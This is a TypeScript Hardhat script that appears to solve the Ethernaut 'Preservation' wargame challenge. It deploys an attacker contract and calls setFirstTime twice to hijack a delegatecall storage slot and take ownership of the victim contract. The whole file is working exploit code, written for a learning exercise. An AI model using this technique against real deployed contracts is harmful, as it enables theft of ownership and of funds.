import { ethers } from "hardhat";
import * as fs from 'fs';
import { Preservation__factory, PreservationAttacker__factory } from '../typechain-types';
import { privateKey, rpc } from "../hardhat.config";

// Task: claim ownership of the contract

const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    console.log("Hacking the contract...");

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/PreservationAttacker.sol/PreservationAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy();
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = PreservationAttacker__factory.connect(attackerAddress, signer);
    const victim = Preservation__factory.connect(instanceAddress, signer);

    const uintAddress = await attacker.getUintAddress();

    tx = await victim.setFirstTime(uintAddress);
    await tx.wait();
    
    tx = await victim.setFirstTime(uintAddress);
    await tx.wait();
    
    const owner = await victim.owner();
    console.log("Successfully hacked!");
    console.log("Attacket contract address", attackerAddress);
    console.log("Victim contract owner:", owner);
}
 
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});